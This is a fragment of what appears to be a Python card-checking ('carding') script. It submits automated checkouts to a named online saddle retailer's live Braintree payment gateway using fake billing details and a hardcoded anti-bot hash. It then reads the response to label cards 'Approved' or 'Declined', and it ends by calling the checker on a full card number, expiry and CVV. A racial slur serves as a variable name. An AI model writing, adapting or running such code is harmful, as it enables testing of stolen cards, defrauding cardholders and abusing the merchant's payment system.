            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fthesaddlehouse.com%2F&wc_order_attribution_session_start_time=2025-03-11+02%3A02%3A35&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=3&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F134.0.0.0+Safari%2F537.36&billing_first_name=Deerek&billing_last_name=Dylan&billing_company=&billing_country=US&billing_address_1=Times+Square%2C+Nueva+York%2C+EE.+UU.&billing_address_2=&billing_city=Manhattan&billing_state=NY&billing_postcode=10036&billing_phone=%2B526466308864&billing_email={self.UseMail}&account_username=&account_password=&ajdg_nobot_answer=&ajdg_nobot_id=0&ajdg_nobot_hash=758dd053b3a21f9bbb4881ed24fd0ed4230afaf5d2dcc6f2eaea18b62382757a&captcha=&captcha_confirm=+&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A22-1&payment_method=braintree_cc&braintree_cc_nonce_key={self.token_card}&braintree_cc_device_data=%7B%22device_session_id%22%3A%225b2b3de810f1c570df03becf3061e3f6%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%228432d773-64e8-429c-a75f-5bc25c13%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fknhtm5ynfmhwpcqm%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fknhtm5ynfmhwpcqm%22%7D%2C%22merchantId%22%3A%22knhtm5ynfmhwpcqm%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Discover%22%2C%22JCB%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22The+Saddle+House%22%2C%22clientId%22%3A%22AY0x68Zb5DJ4Op_0cptcESfdPTZ_iIZdj9cb_bwU1f4L6QpcSk-IN6wqskPHtycWKM0RIXA2sZLbLqoy%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22thesaddlehouse_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%225b2b3de810f1c570df03becf3061e3f6%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%228432d773-64e8-429c-a75f-5bc25c13%22%7D&woocommerce-process-checkout-nonce={self.nonce_Checkout}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&pys_browser_time=16-17%7CTuesday%7CMarch&pys_landing=https%3A%2F%2Fthesaddlehouse.com%2Fproduct-category%2Fsaddle%2Fbarrel-saddles%2F&pys_source=direct&pys_order_type=normal&last_pys_landing=https%3A%2F%2Fthesaddlehouse.com%2Fproduct-category%2Fsaddle%2Fbarrel-saddles%2F&last_pys_source=direct&last_pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&last_pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined'

            nigga = self.session.post('https://thesaddlehouse.com/', params=params, headers=headers, data=data)
            

            if 'class="woocommerce-error"' in nigga.json()['messages']:
                match = re.search(r'class="woocommerce-error".*?>(.*?)</li>', nigga.json()['messages'], re.DOTALL)
                error_message = match.group(1).strip().split('<li>\n')
                return BehaviorsBraintree().Response(error_message[1])
            
            else: return 'Approved! ✅','charged $25.00'
            
       # except:return 'Declined! ❌', 'Declined - Call Issuer'
            


print(b3precha().main('4426441313931192|10|2028|818'))